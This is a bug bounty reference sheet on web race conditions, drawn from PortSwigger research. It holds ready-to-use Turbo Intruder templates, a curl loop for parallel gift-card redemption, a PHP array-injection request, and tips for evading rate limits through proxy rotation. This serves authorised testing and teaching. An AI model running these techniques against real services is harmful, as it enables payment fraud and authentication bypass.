# RACE CONDITIONS — COMPLETE BUG BOUNTY REFERENCE
> Source: PortSwigger Web Security Academy + Research Paper (Black Hat USA 2023)
> For: Bug bounty hunting, CTF, and security assessments

---

## 1. CONCEPTS

### What Are Race Conditions?
A race condition occurs when the application processes multiple requests concurrently, and the result depends on the timing/interleaving of operations. The attacker sends requests that "race" against each other to exploit a window of vulnerability.

### Key Terms
- **TOCTOU** (Time-of-Check to Time-of-Use): File/resource checked then used — gap between check and use is exploitable
- **Sub-state**: Hidden intermediate state within a single request that is security-critical
- **Single-packet attack**: All parallel requests packed into one TCP packet to eliminate network jitter
- **Gate system**: Turbo Intruder mechanism to synchronize request dispatch

### State Machine
```
State A: Not logged in
  → [Login request processed]
State B: Logged in, MFA not enforced  ← EXPLOITABLE WINDOW
  → [MFA check]
State C: Fully authenticated with MFA
```

---

## 2. TYPES OF RACE CONDITIONS

### 2.1 Multi-Endpoint Race Conditions

**Classic E-commerce Exploit:**
```
# Normal flow:
Add item → Pay → Confirm → Done

# Race:
Add item → Pay → [SIMULTANEOUSLY] Add more items → Confirm
# Result: Paid for 1 item, got 3 items
```

**Gift Card Double-Spend:**
```
# Send two redemption requests simultaneously
POST /api/giftcard/redeem
{"code":"GIFT123"}

POST /api/giftcard/redeem  
{"code":"GIFT123"}

# Both may succeed before either marks card as used
```

**Password Reset Token Reuse:**
```
# Reset password for user A → get token
# Reset password for user B → get SAME token (if timestamp-based)
# Use same token for both accounts
```

### 2.2 Single-Endpoint Race Conditions

**Limit Overrun:**
```
# Balance = $100, item = $50
# Send 3 withdrawal requests simultaneously:
POST /api/withdraw {"amount":50}

# If each checks balance BEFORE updating:
#   Request 1: balance=100 > 50 ✓ → withdraw
#   Request 2: balance=100 > 50 ✓ → withdraw  (stale read!)
#   Request 3: balance=100 > 50 ✓ → withdraw  (stale read!)
# Result: $150 withdrawn from $100 balance
```

**Coupon Double-Use:**
```
POST /api/apply-coupon {"coupon":"SAVE50"}
# Send twice simultaneously → discount applied twice
```

**Rating Manipulation:**
```
# Like/dislike simultaneously → count jumps by 2+
# Rating checked for change detection → both succeed
```

### 2.3 Partial Construction Race Conditions

**Uninitialized API Key:**
```
# Step 1: Register new user (user exists but API key uninitialized)
# Step 2: During race window, query API with uninitialized key value
# Step 3: If your query matches uninitialized value → access granted

# PHP array injection to match null:
GET /api/user/info?user=victim&api-key[]= HTTP/2
```

**Incomplete Session Setup:**
```
# Login creates session → sets user ID → THEN enforces MFA
# Race window: session valid + MFA not yet enforced
# Send login + sensitive request simultaneously
```

### 2.4 Hidden Multi-Step Sequences

**MFA Bypass Race:**
```python
session['userid'] = user.userid
# User is now "logged in" (sub-state!)
# MFA enforcement happens next — but there's a window

# Race: Send login + /api/profile simultaneously
# Profile request hits during sub-state before MFA enforcement
```

---

## 3. METHODOLOGY (from PortSwigger Research)

### Step 1: Predict Potential Collisions
- **Security critical?** — Only test endpoints touching auth, payments, state changes
- **Collision potential?** — Two+ requests must operate on the same record
- **Same session?** — Check if race conditions work across different sessions
- **Different users?** — Some races require different user sessions

### Step 2: Probe for Clues

**Benchmark (Sequential):**
```
# Burp Repeater: Send group in sequence (separate connections)
# Record: response codes, response bodies, timing
Request A → Response A (200, body length 500, ~200ms)
Request B → Response B (200, body length 300, ~150ms)
```

**Parallel Test:**
```
# Burp Repeater: Send group in parallel (single-packet attack)
# Compare with baseline:
# - Different response codes? CLUE!
# - Different response bodies? CLUE!
# - Different timing? CLUE!
# - Second-order effects? (emails sent twice, state changed)
```

**Clues include:**
- Different HTTP status codes between sequential and parallel
- Different response body content/length
- Error messages only appearing in parallel
- State changes that shouldn't happen
- Duplicate emails or notifications

### Step 3: Prove the Concept
- Remove unnecessary requests (isolate the minimum collision)
- Reproduce consistently
- Determine impact (double-spend, bypass, data leak)
- Think of it as a structural weakness, not isolated bug

---

## 4. SINGLE-PACKET ATTACK (SPA)

### Concept
Pack all parallel requests into a single TCP packet, eliminating network jitter entirely. This makes race conditions deterministic rather than probabilistic.

### Implementation (Burp Repeater)
1. Group requests in Repeater
2. Right-click → "Send group in parallel"
3. All requests leave server at virtually the same time
4. No need to adjust timing manually

### Implementation (Turbo Intruder — BURP2 Engine)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    # Queue 20 simultaneous requests
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # Release all at once (single-packet attack)
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

### Turbo Intruder Gate System
```python
engine.queue(target.req, gate='A')  # Queue to gate A
engine.queue(target.req2, gate='B')  # Queue to gate B
engine.openGate('A')  # Release gate A
engine.openGate('B')  # Release gate B (synchronized with A)
```

---

## 5. COMMON RACE CONDITIONS IN BUG BOUNTIES

### 5.1 Financial
```
- Double-spend on gift cards/promo codes
- Overdraft via concurrent withdrawals
- Race to redeem limited-time offers
- Coupon/discount application race
- Transfer amount manipulation
```

### 5.2 Authentication
```
- MFA bypass via race on login
- Token reuse across password resets
- Session fixation during multi-step auth
- OAuth state parameter race
```

### 5.3 Business Logic
```
- Vote/like/dislike manipulation
- Inventory manipulation (oversell)
- Rate limit bypass
- CAPTCHA reuse
- Account creation spam
- Referral bonus abuse
```

### 5.4 File Operations
```
- TOCTOU in file validation (upload → validate → execute)
- Race in file deletion (read during deletion)
- Temporary file exploitation
```

### 5.5 Database
```
- Concurrent unique constraint violations
- Race in balance updates (read-modify-write)
- Concurrent state transitions (order status)
- TOCTOU in permission checks
```

---

## 6. EXPLOITATION PAYLOADS

### Burp Repeater Setup
```
1. Create request group with N copies of target request
2. Right-click → "Add tabs to group"
3. Select group → "Send group in parallel"
4. Analyze response deviations vs sequential baseline
```

### Turbo Intruder Template
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2,
                          requestsPerConnection=100)
    
    for i in range(50):
        engine.queue(target.req, gate='1')
    
    engine.openGate('1')

def handleResponse(req, interesting):
    # Mark as interesting if response differs from baseline
    if 'error' in req.response or req.status == 200:
        table.add(req)
```

### curl Race (Poor Man's)
```bash
# Send 10 simultaneous requests
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST \
    https://target.com/api/redeem \
    -d '{"code":"GIFT123"}' -H "Content-Type: application/json" &
done
wait
```

---

## 7. DETECTION CHECKLIST

### Per Endpoint
- [ ] Benchmark sequential response (code, body, timing)
- [ ] Send 5+ parallel requests using SPA
- [ ] Compare each parallel response with baseline
- [ ] Check for any deviation (status, body, timing)
- [ ] Check for second-order effects (emails, state changes)
- [ ] Try with different sessions/users
- [ ] Try with different request counts (2, 5, 10, 20, 50)
- [ ] Try mix of endpoints (A + B simultaneously)

### Common Race Triggers
- [ ] State transitions (pending → completed)
- [ ] Balance/credit operations
- [ ] Token/coupon redemption
- [ ] File upload + validation
- [ ] Multi-step processes (register → confirm → login)
- [ ] Rate-limited actions (password reset, login attempts)

---

## 8. DEFENSE BYPASS TECHNIQUES

### If Rate Limiting on Parallel Requests
```
- Use different source IPs (proxy rotation)
- Use different sessions/cookies
- Space requests in small batches (5-10ms apart)
- Use SPA to bypass timing-based defenses
```

### If CSRF Tokens
```
- Fetch CSRF token first, then race with same token
- Some apps validate CSRF before checking state
- Token might be valid across parallel requests
```

### If Server-Side Locking
```
- Test with higher concurrency (50+ requests)
- Test across multiple sessions
- Test different ordering (X before Y vs Y before X)
- Check for optimistic vs pessimistic locking
```

---

## 9. TOOLS

| Tool | Use Case |
|------|----------|
| Burp Repeater | Send group in parallel (SPA built-in) |
| Turbo Intruder | Custom race conditions, large-scale |
| ZAP | Parallel request testing |
| curl + bash | Quick manual race test |
| Python threading | Custom race scripts |
| Siege | Load testing for race conditions |

### Turbo Intruder Resources
- BApp Store: "Turbo Intruder"
- GitHub: github.com/PortSwigger/turbo-intruder
- Key: BURP2 engine + gate system for SPA

---

*Last updated: 2026-09-03*
*Sources: PortSwigger "Smashing the State Machine" (Black Hat USA 2023), PortSwigger Academy*
